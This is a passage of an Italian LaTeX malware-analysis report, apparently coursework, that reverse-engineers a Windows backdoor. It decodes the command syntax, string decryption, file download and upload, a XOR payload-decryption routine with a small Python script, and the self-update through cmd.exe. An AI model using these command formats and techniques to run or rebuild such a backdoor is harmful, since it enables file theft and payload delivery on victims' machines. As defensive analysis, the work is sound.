+            Possiamo quindi dire che "internamente" si calcola il numero della funzionalità - che può
+            essere uno di $\{\,0,\,1,\,2,\,3,\,4,\,5,\,6,\,7,\,8\,\}$ - dal codice che fornisce l'utente
+            nel comando, che può partire da "1" $\rightarrow$ 1, "2" $\rightarrow$ 2,\dots, "8" $\rightarrow$ 8, "9" $\rightarrow$ 0, "10" $\rightarrow$ 1, \dots (e quindi riparte il mapping).
+            "0" non è ammesso ("0" $\rightarrow$ -1) e non corrisponde ad alcun comando.
+
+            \subsection{Funzione "setinterval" (codice 2)}
+
+            \pic{adv_setinterval}{}{17cm}{4cm}
+
+            La parte più interessante è sicuramente la terza riga, dove c'è una \texttt{atoi} di \texttt{realArgs} (figura \ref{fig:adv_p3}, in \texttt{realArgs} c'è TUTTA la stringa di argomenti, inclusi spazi). In pratica, essendo una \texttt{atoi} l'argomento
+            è uno soltanto e deve essere un intero in base 10.
+
+            Da questo e quanto visto prima, deduciamo che la stringa da inviare al malware contenente comando e
+            argomenti è:
+
+            \begin{itemize}
+                \item \texttt{<NumOfFun>}: per eseguire comando senza argomenti.
+                \item \texttt{<NumOfFun>[|ArgsOfFun]}: per eseguire comando con argomenti.
+            \end{itemize}
+
+            A questo punto, risulta immediato capire che la sintassi per eseguire il comando 2 è ad esempio:
+            \texttt{2|10}
+
+            Mentre per eseguire il più semplice comando uninstall (comando 7), basterà inviare \texttt{7}.
+
+            Cercando tra le references per la variabile alla quale viene assegnato il risultato di \texttt{atoi}
+
+            \pic{adv_sleeppush}{Reference, lettura variabile scritta con risultato di \texttt{atoi}}{10cm}{3cm}
+
+            Ma \texttt{FUN\_0000B360} era il wrapper per la sleep (figura \ref{fig:sleep}):
+
+            \pic{adv_sleepwrap}{Calcolo dei ms per la sleep (wrapper della sleep, \texttt{FUN\_0000B360})}{12cm}{4cm}
+
+            \textbf{Si deduce come setinterval sia utilizzata per regolare il tempo che intercorre tra una 
+            comunicazione e l'altra, ricordando come veniva utilizzato questo wrapper}.
+
+            Il tempo in ms di sleep, viene calcolato come segue:
+
+            \begin{equation}
+t(x) = 3e8_{16} * 3c_{16} * x
+            \end{equation}
+
+            dove $x$ può essere cambiato tramite l'usage di setinterval (è la stessa var. alla quale viene assegnato il valore di \texttt{atoi}) nel comando e di default è $1e_{16}$.
+
+            \begin{equation}
+t(1e_{16}) = 1800000_{10}
+            \end{equation}
+            
+            di conseguenza, di default l'attesa tra una comm. e l'altra è di 30 min. In particolare, dopo aver
+            inviato la risposta ad un comando, il malware rimane in attesa di 30 min prima di riinviare la solita richiesta GET che permette al server di inviare un comando (evidente in figura \ref{fig:pyhttpans_mainthr_callstack})
+
+            \subsubsection{Operazioni strane con le stringhe}
+
+            Dal name mangling risulta evidente come in figura \ref{fig:adv_setinterval} sia presente almeno  un qualche costruttore di \texttt{string} del C++,
+            partendo dall'alias \texttt{basic\_string} (anyctor sta ad indicare il fatto che può essere
+            uno dei tanti costruttori di \texttt{std::string}):
+            \pic{adv_stds}{Costruttore \texttt{std::string} del C++}{9cm}{3cm}
+
+            Mentre la funzione \texttt{FUN\_0000E4C0}:
+            \pic{adv_seems_encfn}{Corpo funzione decompilata}{16cm}{10cm}
+
+            Essendo stati passati i valori di ritorno della funzione \texttt{FUN\_0000E4C0} al costruttore di
+            \texttt{std::string}, possiamo cambiarne la signature:
+
+            \pic{adv_strunk}{Signature di \texttt{FUN\_0000E4C0} cambiata}{13cm}{3cm}
+
+            Inoltre, cercando le costanti (puntatori, come riconosciuto da Ghidra) passate a \texttt{FUN\_0000E4C0} (figura \ref{fig:adv_stds}):
+
+            \begin{lstlisting}
+>>> hex(0x477c15c - 0x4750000)  # costante - BaseAddress
+'0x2c15c'                       # indirizzo da cercare in ghidra
+            \end{lstlisting}
+
+            Otteniamo byte senza senso:
+
+            \pic{adv_nonsensestr}{}{10cm}{8cm}
+
+            Ma la funzione \texttt{StrUnknownOp} ha tutta l'aria di essere una funzione di decifratura
+            (ultimo forloop in figura \ref{fig:adv_seems_encfn}, presenza di XOR e derivazione keystream),
+            quindi passo al debugger, setto un breakpoint su \texttt{FUN\_0000E4C0} e si vede che cosa ne esce fuori dalla funzione in
+            questione.
+
+            \pic{adv_brkp_encfn}{Set dei breakpoint: \texttt{push CONST}, \texttt{call fun}}{15cm}{4cm}
+
+            Dopo aver invocato la funzionalità 2, viene raggiunto il breakpoint e il valore di ritorno (EAX)
+            della funzione (step over) è un puntatore alla stringa comprensibile (decifrata)
+
+            \pic{adv_decrypt}{Risultato esecuzione post-\texttt{CALL 0475E4C0} (reg. EAX)}{18cm}{1.5cm}
+
+            Al puntatore costante (indirizzo di memoria) passato alla funzione di decifratura, è sempre presente la stringa cifrata,
+            pronta per essere decifrata altre volte. La locazione di memoria della stringa decifrata cambia
+            di volta in volta.
+
+            \pic{adv_stillenc}{La stessa stringa cifrata sempre presente}{15cm}{1.5cm}
+
+            Rinomino la funzione \texttt{StrUnknownOp} $\rightarrow$ \texttt{StrDecrypt} che decifra le stringhe
+            hardcoded del malware.
+
+            Queste stringhe sono informative, di errore o di successo, e vengono, una volta decifrate,
+            concatenate nella stringa di risposta che il malware invia al server di controllo (ad esempio
+            \texttt{"[+] Interval"}, \texttt{"[+] Wrong URL!"}\dots)
+
+            Tramite la \texttt{std::string} che è una classe C++ (si ha a che fare con ABI più complicate
+            a causa di overloading, costruttori, puntatori this di istanza, \dots) in qualche modo le stringhe
+            decifrate e il valore dell'argometo passato alla setinterval vengono concatenati per mandare un unica
+            stringa come risposta.
+
+            \pic{adv_2_ok}{Funzionalità 2 risolta completamente}{11cm}{5cm}
+
+            \subsubsection{Prova della funzionalità}
+
+            Seguendo lo stesso approccio usato per scoprire i comandi, facciamo cifrare al malware il comando
+            che gli verrà inviato tramite il debugger:
+
+            Comando da cifrare: \texttt{"2|0"}
+
+            \pic{adv_edit}{Comando da cifrare}{5cm}{2.5cm}
+
+            \pic{adv_edit_enc}{Comando cifrato}{6cm}{2.5cm}
+
+            Rimandando il comando al malware
+
+            \pic{adv_2_ans}{Concatenazione di stringhe}{18cm}{1.5cm}
+
+            E l'effetto è quello desiderato. Senza dover patchare ogni volta in-memory il codice del wrapper
+            della Sleep, basta inviare questo comando per annullarne l'effetto e non dover aspettare mezz'ora
+            prima di poter inviare un altro comando.
+
+            \subsection{Funzione "paramdl" (codice 0)}\label{sect:paramdl}
+
+            Effettua handling degli argomenti passati alla funzionalità in modo specializzato, ovvero:
+            tutte le funzionalità gestiscono gli argomenti (che sono contenuti nella substring compresa tra 
+            il carattere immediatamente dopo la pipe symbol della stringa di comando e la sua fine) per loro 
+            conto (nel senso che a ogni funzionalità viene passata la substring descritta sopra, come la 
+            interpreteranno sta a loro decidere).
+            
+            Il separatore tra gli argomenti non è più la pipe symbol ma un whitespace.
+            
+            In particolare quindi il comando si aspetta 2 argomenti.
+            Se il numero di argomenti è $<$ 2 (c'è un solo spazio) allora risponde con stringa d'errore:
+
+            \pic{adv_0_check}{Argument checking}{19cm}{7cm}
+
+            Una volta verificata la presenza dei due argomenti richiesti, ottieni il primo e secondo
+            argomento sapendo che dopo lo spazio inizia il secondo argomento (e quindi finisce il primo) e
+            al carattere NUL finisce.
+
+            \pic{adv_0_checkok}{Estrazione/isolamento argomenti}{19cm}{7cm}
+
+            Esegue poi delle funzioni "core" per la funzionalità offerta. Per il momento ne skippiamo l'analisi
+            data l'elevata complessità - speriamo di riuscire a capire di cosa si tratta provando a eseguire
+            il comando secondo specifiche di args
+
+            \pic{adv_0_core}{Esecuzione funzioni core}{13cm}{3cm}
+
+            \texttt{genericBuf} e \texttt{genericBuf1} sono legati (consecutivi in memoria) ma Ghidra non riesce 
+            a "mergiarli" in un unico buffer
+            
+            \pic{adv_0_bufs}{Buffer unico da 1200 bytes}{6cm}{1.5cm}
+
+            Dopo aver eseguito le funzioni core, inizia a buildare una stringa di output\dots
+
+            \pic{adv_0_startstr}{Costruzione stringa di output}{10cm}{6cm}
+
+            \dots e terminala con l'esito dell'esecuzione della funzionalità
+
+            \pic{adv_0_finstr}{\texttt{functionCode} è in realtà il risultato della funzione core (in figura \ref{fig:adv_0_core})}{10cm}{6cm}
+
+            \subsubsection{Prova della funzionalità}
+
+            Avendo capito come funziona il parsing, proviamo a cifrare e inviare la stringa di comando al malware:
+
+            \begin{center}
+            \texttt{9|aaaa bbbb}
+            \end{center}
+            
+            \pic{adv_0_cmd_res}{\texttt{Wrong URL}}{19cm}{1.5cm}
+
+            Beh, leggere "download result" e "url" ci fa pensare al fatto che il malware scarica qualcosa
+            dal web, quel qualcosa è un file tramite HTTP.
+
+            Inizialmente 
+            
+            \begin{center}
+            \texttt{9|https://www.google.com/index.html abababab}
+            \end{center} 
+            
+            restituiva errore (wrong URL)
+            ma era semplicemente perchè ApateDNS era avviato e infatti sul log delle risoluzioni DNS effettuate
+            dal sistema appariva puntualmente google.com.
+
+            Comunque, disattivando ApateDNS:
+            
+            \pic{adv_0_success}{\texttt{Download Succed!}}{19cm}{1cm}
+
+            L'argomento path "abababab", è ora auto-esplicativo, nello stesso punto
+            in cui è stato scaricato il malware originario, sample.exe, si può osservare il contenuto della
+            pagina HTML scaricata da google.com/index.html tramite HTTP, rinominata "abababab":
+
+            \pic{adv_0_success_content}{Pagina HTML di risposta da Google salvata come \texttt{abababab} argomento Path fornito al comando}{18cm}{10cm}
+
+            La richiesta effettuata dal malware, comunque, non è una normale GET come previsto dalla semantica
+            HTTP per scaricare file, ma è una POST, pensata per l'upload. Il server di Google restituisce
+            comunque un corpo di risposta e errore. Probabilmente la funzionalità è pensata per 
+            funzionare con determinati server (scritti dagli sviluppatori stessi del malware) che ignorano
+            le semantiche dei metodi HTTP. In più, non viene specificato l'header \texttt{Content-Length}
+            e il server di Google risponde con \texttt{411 Length Required}.
+
+            \pic{adv_0_illformed_request}{Richiesta HTTP POST per scaricare}{18cm}{9cm}
+
+            Da procmon, all'esecuzione del comando, questi sono i log:
+
+            \pic{adv_0_procmon}{Apertura connessione, scrittura file e terminazione thread}{15cm}{5cm}
+
+            \textbf{Questa funzionalità permette di scaricare file sul PC vittima da un server remoto}.
+
+            \subsection{Funzione "paramup" (codice 1)}
+
+            Il codice di "paramup" è del tutto simile a quella di "paramdl" della sezione \ref{sect:paramdl}.
+
+            Una delle "funzioni core" chiamate è però più leggibile e sembra avere a che fare con un file
+            aperto nel computer locale:
+
+            \pic{adv_1_fileread}{Funzioni libreria standard C per manip. file}{15cm}{8cm}
+
+            La signature corrispondente alla funzione in figura \ref{fig:adv_1_fileread} è qualcosa del genere e il resto della funzione non è propriamente comprensibile
+            quindi speriamo di ottenere informazioni sul funzionamento eseguendo il comando:
+
+            \pic{adv_1_filesign}{Signature di una delle funzioni core}{18cm}{2cm}
+
+            La prima funzione core chiamata è \texttt{FUN\_0000B620} e veniva invocata anche al comando "paramdl",
+            come evidente in figura \ref{fig:adv_0_core}.
+            La seconda funzione è la \texttt{ReadLocalFile} appena analizzata parzialmente, Ghidra
+            indica che il secondo argomento passato è l'attuale di \texttt{path} passato alla funzione
+            (figura \ref{fig:adv_1_filesign}):
+
+            \pic{adv_1_secondpass}{}{18cm}{5cm}
+
+            \subsubsection{Prova della funzionalità}
+
+            Provando a cifrare e inviare al malware il comando 
+
+            \begin{center}
+            \texttt{1|aaaa bbbb}
+            \end{center}
+            
+            \pic{adv_1_exec}{\texttt{Upload failed}}{19cm}{1cm}
+
+            Ma vediamo che il primo argomento (corrisp. \texttt{Url}) è un URL, 
+            il secondo argomento sappiamo essere un path (fs locale, come visto dalla figura \ref{fig:adv_1_secondpass} e 
+            \ref{fig:adv_1_filesign}, e quindi l'implementazione in figura \ref{fig:adv_1_fileread})
+            perciò per il prossimo comando, tentiamo di caricare su google il file \texttt{abababab} scaricato
+            col comando paramdl. Il carattere backslash per il path è obbligatorio perchè l'implementazione
+            di \texttt{ReadLocalFile} effettua una \texttt{strchr} del carattere sul \texttt{path} passatogli
+            (figura \ref{fig:adv_1_fileread}). 
+            
+            Il comando risulta essere:
+
+            \begin{center}
+            \texttt{1|https://www.google.com/index.html .\textbackslash abababab}
+            \end{center}
+            
+            L'output non si legge bene:
+            
+            \texttt{[+] Upload Result}
+            
+            \texttt{<Path: .\textbackslash abababab>}
+            
+            \texttt{<Url: http://www.google.com/index.html>}
+            
+            \texttt{Uploaded Size(bytes) : 3128>}
+            
+            \texttt{[+] Upload Succed!}
+            
+            \pic{adv_1_exec_ok}{Esecuzione del comando riuscita}{19cm}{1cm}
+
+            \pic{adv_1_procmon_0}{Apertura e lettura del file}{15cm}{3cm}
+
+            Il log di procmon conferma che si tratta di upload di file locale verso server esterno:
+
+            \pic{adv_1_procmon}{Connessione TCP al server di Google}{17cm}{3cm}
+
+            In termini di protocollo, si tratta di una HTTP POST (sta volta usata per il vero scopo), ovviamente
+            google.com rifiuta sistematicamente l'upload per cambiare la propria index.html con quanto inviato.
+            Il malware ritorna upload succeed ma si basa solamente sul fatto che la connessione col server
+            è avvenuta e non parsa la risposta HTTP (stessa cosa per il comando precedente "paramdl"),
+            infatti il codice d'errore nella risposta HTTP di Google è \texttt{405 Method Not Allowed}.
+
+            \pic{adv_1_wireshark_0}{Header richiesta HTTP}{19cm}{6cm}
+
+            Il contenuto del file locale (file \texttt{abababab} precedentemente scaricato, figura 
+            \ref{fig:adv_0_success_content})
+            inviato in chiaro è visibile nel corpo della richiesta HTTP malware $
+            \rightarrow$ server Google
+
+            \pic{adv_1_wireshark_1}{Contenuto del file caricato}{19cm}{8cm}
+
+            \textbf{Questa funzionalità permette di caricare file su un server remoto dal PC vittima}.
+
+            \subsection{Funzione "execdlparam" (codice 8)}
+
+            Anche qui, il codice è pressochè identico a quanto visto fin'ora: i soliti due argomenti
+            previsti, esecuzione di una funzione core, costruzione stringa di esito esecuzione.
+
+            \pic{adv_8_firstpass}{Prima parte: parse args e chiamata funzione core \texttt{FUN\_0000D660}}{15cm}{8cm}
+            \pic{adv_8_secondpass}{Seconda parte, costruzione stringa esito esecuzione}{10cm}{10cm}
+            
+            Come al solito ci vogliamo evitare l'analisi del disassemblato/decompilato della funzione core,
+            quindi proviamo ad eseguire il comando sapendo come vengono parsati gli argomenti.
+
+            \subsubsection{Prova della funzionalità}
+
+            Cifrando e inviando il comando:
+            \begin{center}
+                \texttt{8|aaaa bbbb}
+            \end{center}
+
+            \pic{adv_8_exec_fail}{\texttt{Wrong URL}}{19cm}{2cm}
+
+            Quindi provo il comando
+            \begin{center}
+                \texttt{8|http://www.google.com/index.html bbbb}
+            \end{center}
+            
+            e stoppando ApateDNS:
+
+            \pic{adv_8_exec_ok}{\texttt{Executable Download Succed!}}{19cm}{1.5cm}
+
+            Tuttavia il file \texttt{bbbb} che ne esce fuori:
+
+            \pic{adv_8_unkfile}{File scaricato?}{19cm}{14cm}
+
+            Per capire cosa succede mi affido a Wireshark e Procmon:
+
+            Come al solito, data la richiesta effettuata dal malware si può intuire che sia stato sviluppato
+            un server apposito per rispondere a questo tipo di richieste (come per il comando "paramdl"):
+            \pic{adv_8_req}{Richiesta HTTP del malware}{10cm}{5cm}
+
+            E la relativa risposta di Google (\texttt{411 Length Required}):
+            \pic{adv_8_res}{Risposta di Google}{10cm}{5cm}
+
+            Il corpo della risposta di Google che è leggibile al contrario del file \texttt{bbbb} nel filesystem
+            \pic{adv_8_text}{Corpo della risposta}{11cm}{6cm}
+
+            Connessione al server
+            \pic{adv_8_pm1}{Apertura connession TCP}{18cm}{2cm}
+
+            La scrittura di un file temporaneo che poi viene immediatamente eliminato
+            \pic{adv_8_pm2}{Scrittura file temporaneo}{10cm}{3cm}
+
+            E infine la scrittura del file \texttt{bbbb}
+            \pic{adv_8_pm3}{Scrittura file finale, terminazione del thread}{15cm}{8cm}
+
+            Siccome non sono presenti informazioni aggiuntive utili, dobbiamo per forza analizzare la funzione
+            core (totalmente o parzialmente).
+
+            \subsubsection{File risultante strano (analisi core function)}
+
+            La signature della core function, conoscendo argomenti attuali passati dalla funzione chiamante
+            e valore di ritorno sfruttato per determinare e inviare stringa esito esecuzione comando:
+            \pic{adv_8_core_sign}{Signature}{10cm}{1.5cm}
+
+            Analizzando la prima funzione chiamata dalla funzione core stessa:
+
+            \pic{adv_8_core_firstpass}{Funzione chiamata dalla funzione core}{10cm}{2cm}
+
+            E quindi l'analisi di \texttt{FUN\_0000D220}:
+            
+            \pic{adv_8_core_d220}{Thunks non identificabili}{15cm}{8cm}
+
+            Per capire in maniera più approfondita, dobbiamo ricorrere al debugger per trovare i puntatori
+            a funzione e la stringa di formato passata alla \texttt{swprintf}
+
+            \pic{adv_8_core_d220_dbg}{Thunks precedenti risolti}{15.5cm}{3cm}
+
+            E poi la stringa di formato:
+
+            \pic{adv_8_core_d220_fmt}{Stringa di formato}{8.5cm}{2cm}
+
+            Quindi dalle informazioni dedotte, la funzione decompilata:
+
+            \pic{adv_8_core_d220_ok}{\texttt{GetTempFilePath}}{18cm}{13cm}
+
+            Dove \texttt{outBuf}, dopo l'esecuzione di \texttt{GetTempFilePath} è (basata sui \texttt{rand} e
+            il system time al momento della chiamata di \texttt{GetSystemTime}):
+
+            \pic{adv_8_core_temp}{}{15cm}{2.5cm}
+
+            Procedendo con la funzione core, si procede ad analizzare le altre routine che chiama 
+            con le stesse modalità, quindi, senza entrare nei dettagli di ogni singola funzione chiamata
+            da ora in poi\dots
+
+            \pic{adv_8_core_bzero}{Zeroing dei buffer per il file temp e l'URL manipolato (sempre lo stesso in realtà)}{15cm}{4.5cm}
+
+            Il contenuto della pagina viene scaricato nel temp file
+            \pic{adv_8_core_dlnalloc}{Download e init}{13.5cm}{5cm}
+
+            Post-download il file appena scritto (temp file) viene letto in un buffer allocato nell'heap:
+            \pic{adv_8_core_fopen}{Apertura e lettura del temp file}{14cm}{3.5cm}
+
+            E qui si arriva alla funzione più importante: \texttt{DecryptAndStoreInFinalFile}
+            \pic{adv_8_core_decrypt}{Decryption/Encryption}{14cm}{4.5cm}
+
+            All'interno di \texttt{DecryptAndStoreInFinalFile} c'è un loop che itera sul buffer allocato 
+            nell'heap che ha il contenuto del temp file e byte dopo byte applica lo XOR (in-place) con una certa chiave. In
+            realtà si può usare sia per cifrare che per decifrare il contenuto:
+            \pic{adv_8_core_decrypt_fn}{Procedura di "dec/enc"}{18cm}{5cm}
+
+            Il contenuto del buffer allocato sull'heap cifrato/decifrato viene scritto nel file finale (quello
+            specificato all'origine come argomento della funzionalita del malware)
+            \pic{adv_8_core_decrypt_finalwrite}{Scrittura del buffer nel file finale}{14.5cm}{4cm}
+
+            \pic{adv_8_core_decrypt_cleanup}{Cleaunp}{15.5cm}{3cm}
+
+            Invece che provare a capire la funzione di inversione "decenc" dalla figura 
+            \ref{fig:adv_8_core_decrypt_fn}, conviene vedere l'esecuzione dal debugger: questa
+            è la parte più importante del loop:
+            \begin{enumerate}
+                \item Indirizzo della encryption key
+                \item Dereference e sostituzione byte invertito dec/enc
+                \item \texttt{ECX} contiene il byte originale
+            \end{enumerate}
+            \pic{adv_8_core_decrypt_dbg_main}{Procedura di cifratura/decifratura}{12cm}{5cm}
+
+            Chiave utilizzata:
+
+            \pic{adv_8_core_decrypt_dbg_key}{Chiave utilizzata (punto 1 figura 
+            \ref{fig:adv_8_core_decrypt_dbg_main})}{16cm}{1.5cm}
+
+            Buffer soggetto all'inversione tramite XOR:
+
+            \pic{adv_8_core_decrypt_dbg_plaintext}{Plaintext su cui applicare lo XOR (punto 2 figura 
+            \ref{fig:adv_8_core_decrypt_dbg_main})}{16cm}{9cm}
+
+            Buffer "in inversione":
+
+            \pic{adv_8_core_decrypt_dbg_partial_encrypt}{Cifratura del testo (sempre punto 2 figura 
+            \ref{fig:adv_8_core_decrypt_dbg_main}, in corso\dots)}{16cm}{9cm}
+
+            Analizzando i buffer, facendo varie iterazioni e analizzando i registri, arriviamo a descrivere
+            l'algoritmo di dec/enc, dal body della risposta HTTP:
+            
+            \begin{itemize}
+                \item I primi due byte vengono ignorati
+                \item Dal terzo al 19-esimo byte si ha la chiave di cifratura/decifratura
+                \item Dal 20-esimo byte fino alla fine si ha il contenuto da cifrare/decifrare
+                \item Il byte della chiave viene messo in XOR con byte del contenuto. I byte della chiave
+                vengono fatti scorrere modulo 16:
+                \begin{equation}
+                    ReversedBytes=\{\; B_0 \oplus K_{0\;mod\;16},\; B_1 \oplus K_{1\;mod\;16},\; \dots,
+                    \; B_{17} \oplus K_{17\;mod\;16},\; \dots,\; B_n \oplus K_{n\;mod\;16} \;\}
+                \end{equation}
+                \textit{(Gli indici vanno shiftati in base a come viene visto il contenuto)}
+            \end{itemize}
+
+            Una semplice procedura in python permette facilmente di decifrare/cifrare qualunque file:
+            \begin{lstlisting}[language=Python]
+#!/usr/bin/python
+
+def decenc_f(path, ascii_key):
+    out_bytes = []
+    
+    f = open(path, "rb")
+    content = f.read()
+    f.close()
+
+    key = ascii_key.encode("ascii")
+
+    for i, cbyte in enumerate(content):
+        out_bytes.append(cbyte ^ key[i % 16])           # ^ symbol is hat - XOR
+        
+    return out_bytes
+        
+    
+inverse = decenc_f("bbbb", "DOCTYPE html>\n<h")
+
+for c in inverse:
+    print(chr(c), end="")
+            \end{lstlisting}
+
+            Eseguendo lo script per decifrare il file "bbbb" (figura \ref{fig:adv_8_unkfile}):
+            
+            \pic{adv_8_core_decrypt_script_output}{File "bbbb" decifrato - parte della pagina HTML di Google}{19cm}{7cm}
+
+            Nel nostro caso, non avendo usato il comando opportunamente, la chiave è quella riportata nello
+            script usato per decifrare "bbbb".
+
+            Da \texttt{UnknownCore\_8} $\rightarrow$ \texttt{DownloadFileThenApplyDecEnc}
+
+            \pic{adv_8_core_newsign}{Nuova signature}{14cm}{1.5cm}
+
+            \textbf{Questa funzionalità permette di scaricare file cifrato sul PC vittima da un server remoto 
+            . La funzione di decifratura (o meglio, di inversione) si occuperà di decifrarlo}.
+
+            \subsection{Funzione "update" (codice 5)}
+            
+            \pic{adv_5}{Punti di interesse}{15cm}{10cm}
+
+            La funzionalità è identica alle altre come "pattern", prevede un unico argomento (come si 
+            vede dalla chiamata a \texttt{GetUrlByMode} e dal suo argomento \texttt{realArgs} che è il
+            contenuto degli argomenti passati al comando, che viene passato direttamente senza cercare
+            separatori) e riutilizza due funzioni già analizzate. Riusciamo anche immediatamente a capire
+            quale sia l'unico argomento passato al comando - un URL.
+
+            La funzione \texttt{GetUrlByMode} è già stata analizzata ma non sappiamo cosa sia mode, che sta
+            volta è stato impostato a 1, mentre prima (figura \ref{fig:adv_8_core_bzero}) era a 0.
+
+            Cerchiamo di capire che significa:
+
+            \pic{adv_5_url_modes}{Stringhe non cifrate presenti in memoria del malware}{15cm}{3.5cm}
+
+            \pic{adv_5_url_calc}{\texttt{StrAddr - BaseAddr}}{10cm}{2cm}
+
+            \pic{adv_5_url_fmts}{Stringhe formato passate a \texttt{swprintf}}{10cm}{3cm}
+
+            In pratica la \texttt{mode} specifica se l'URL da comporre usa o no HTTPS:
+            
+            \pic{adv_5_url_sign}{Cambio signature}{15cm}{1.5cm}
+
+            Invece, tornando all'ultima freccia a destra della figura \ref{fig:adv_5}, è l'argomento attuale
+            del puntatore alla stringa \texttt{finalFile} della funzione ampiamente analizzata in sezione
+            precedente:
+
+            \pic{adv_5_finalfile}{File destinazione del download}{16cm}{2cm}
+
+            \subsubsection{Prova della funzionalità}
+            Facendo eseguire il comando, sia con argomenti che senza e con URL errato o meno, dopo che il
+            server di controllo riceve la stringa-esito dell'esecuzione, il malware termina il processo.
+
+            \subsubsection{\texttt{LaterAction}}
+
+            La variabile \texttt{\_DAT\_04780e44} alla quale è stata assegnata la dword \texttt{5} in figura
+            \ref{fig:adv_5} è stata rinominata in \texttt{\_laterAction} perchè in base al valore assegnatogli,
+            \textbf{dopo} aver inviato l'esito dell'esecuzione della funzionalità dal malware al server di
+            controllo, viene eseguita l'azione corrispondente. Nei comandi che eseguono l'azione \textbf{prima}
+            dell'invio dell'esito, \texttt{\_laterAction} è posta a 0, altrimenti è settata di valore pari
+            al \texttt{functionCode} (\texttt{plugindl}, \texttt{uninstall} e la stessa \texttt{update}).
+
+            \pic{adv_5_later_refs}{refs a \texttt{laterAction}}{14cm}{6cm}
+
+            In riferimento alla figura \ref{fig:adv_5_later_refs}, le write vengono eseguite in corrispondenza
+            dell'esecuzione di ogni funzionalità (spieg. sopra) e le reads sono i check che il malware effettua
+            dopo aver risposto al server con la stringa-esito dell'esecuzione funzionalità richiesta. Se uno
+            dei check ha esito positivo, viene eseguita la \texttt{laterAction} corrispondente alla funzione 
+            richiesta.
+            In questo caso consideriamo la 5 che è quella che interessa a noi attualmente:
+            
+            \pic{adv_5_later}{\texttt{Sleep(2000)}}{9cm}{2cm}
+
+            Vengono iniziallizzate strutture dati \texttt{STARTUPINFOA}, \texttt{PROCESSINFORMATION},
+            azzeramento di memoria di \texttt{exeCmdLine}, puntamento al percorso del file del malware stesso 
+            (visto in figura \ref{fig:adv_5_finalfile}) e decryption stringa di formato \texttt{"cmd.exe /c 
+            \%s"} 
+
+            \pic{adv_5_later_init}{Init ops}{15cm}{7.5cm}
+
+            Il buffer \texttt{exeCmdLine} è popolato dalla \texttt{swprintf} con la stringa di formato scritta
+            sopra e come argomento matching al \texttt{\%s} il path all'exe del malware nel fs (figura 
+            \ref{fig:adv_5_finalfile}).
+
+            Viene quindi chiamata la WinAPI \texttt{CreateProcessA} sulla \texttt{CmdLine}:
+
+            \begin{center}
+                \texttt{"cmd.exe /c C:\textbackslash\textbackslash Users\textbackslash\textbackslash 
+                ste\textbackslash\textbackslash Desktop\textbackslash\textbackslash sample.exe"}
+            \end{center}
+
+            E immediatamente dopo il processo corrente viene terminato.
+            
+            \pic{adv_5_later_cpa_then_exit}{Creazione nuovo processo e uscita del corrente}{18cm}{2.5cm}
+
+            \pic{adv_5_later_epw}{Wrapper}{9cm}{4cm}
+
+            Unendo i puntini:
+            \begin{enumerate}
+                \item Il nome del comando "update" derivato dall'errore in figura \ref{fig:fn5}
+                \item Il fatto che viene scaricato un file eseguibile cifrato e poi decifrato (il contrario non 
+                avrebbe senso, non sarebbe eseguibile) come da procedura (identica) nella sezione precedente 
+                (funz. execdlparam)
+                \item Il fatto che questo file eseguibile sostituisca l'eseguibile (immagine) nel filesystem (stessa identica path) del processo 
+                corrente che è il malware stesso
+                \item Infine, il fatto che immediatamente dopo queste azioni il malware esegua questo nuovo
+                eseguibile e termini il processo corrente
+            \end{enumerate}
+
+            \textbf{Si deduce che questa funzionalità serve a aggiornare/sostituire il malware con un'altra build/versione
+            magari con altri meccanismi/funzioni/\dots}.
+
+            \subsection{Funzione "plugindl" (codice 4)}
+
+            L'ultima funzionalità da analizzare è "plugindl", partendo quindi dall'else-if del
+            dispatcher, i buffer sono hardcoded (cambia la base di caricamento del malware):
+
+            \pic{adv_4_gettmp}{\texttt{GetTempFilePath}}{16cm}{3.5cm}
+
+            La gestione degli argomenti passati prevede un arg. obbligatorio e il secondo opzionale,
+            quindi comandi validi sono:
+
+            \begin{center}
+                \texttt{4|aaaa}
+                
+                \texttt{4|aaaa bbbb}
+            \end{center}
+
+            Nel caso in cui il secondo argomento non viene trovato, il buffer \texttt{secondFnArg} viene riempito di zero
+            e \texttt{firstFnArg} è l'intera args string:
+
+            \pic{adv_4_notok}{Secondo argomento non trovato}{17cm}{8cm}
+
+            Altrimenti, trovato lo spazio, si effettua lo splitting opportuno:
+
+            \pic{adv_4_tok}{Secondo argomento trovato}{15cm}{8cm}
+
+            A prescindere, il secondo argomento viene copiato in \texttt{0x4781d66} che verrà utilizzato
+            dopo (nella later action), e quindi computato un URL (il primo argomento è un URL):
+            \pic{adv_4_cpy_geturl}{\texttt{GetUrlByTls}}{13cm}{4cm}
+
+            Viene effettuato il download dall'URL fornito come primo arg. di funzionalità verso il tmp file
+            computato in figura \ref{fig:adv_4_gettmp} e quindi setatta a prescindere la variabile 
+            \texttt{\_laterAction}.
+            \pic{adv_4_dltmp}{Download e set variabile}{14cm}{2cm}
+
+            Immediatamente dopo il download il malware costruisce la solita stringa-esito da inviare e lo fa in
+            base al valore di ritorno di \texttt{DownloadToTmpFile}. In base al valore di ritorno di quest'ultima
+            funzione imposta anche la variabile \texttt{\_readSize} a 0 in caso di errore e infatti
+            il check seguente fallirebbe (\texttt{laterAction} è SETTATA A PRESCINDERE A 4):
+            
+            \pic{adv_4_later_init}{Check da superare per eseguire la later action}{14cm}{6cm}  
+
+            \pic{adv_4_later_fopen}{\texttt{fopen\_s}}{14cm}{2cm}
+
+            Una volta aperto il tmp file con successo, viene letto in un \texttt{\_tmpFileBuf} di 
+            \texttt{\_readSize} bytes: la stessa quantità per la quale veniva eseguito il check in figura 
+            \ref{fig:adv_4_later_init} e in particolare, dalla figura \ref{fig:adv_4_later_readsize} nella
+            freccia viene indicato l'unico punto nel quale \texttt{\_readSize} viene scritta con valore
+            (potenzialmente) diverso da 0, ovvero nella funzione prima chiamata (figura \ref{fig:adv_4_dltmp}): 
+            \texttt{DownloadToTmpFile}.
+
+            Se \texttt{actualReadBytes} $=$ \texttt{\_readSize} allora chiude il tmp file, lo elimina (
+            contenuto già letto in \texttt{\_tmpFileBuf}) e chiama \texttt{UnknownFn}.
+            
+            \pic{adv_4_later_readok}{\texttt{fread}}{17cm}{5cm}
+
+            \pic{adv_4_later_readsize}{References per \texttt{\_readSize}}{17cm}{7.5cm}
+
+            Se \texttt{actualReadBytes} $\neq$ \texttt{\_readSize} allora chiudi il tmp file ed eliminalo
+            
+            \pic{adv_4_later_readfail}{\texttt{DeleteFileA}}{9.5cm}{3.5cm}
+
+            \subsubsection{Analisi statica di \texttt{UnknownFn(int size)}}
+
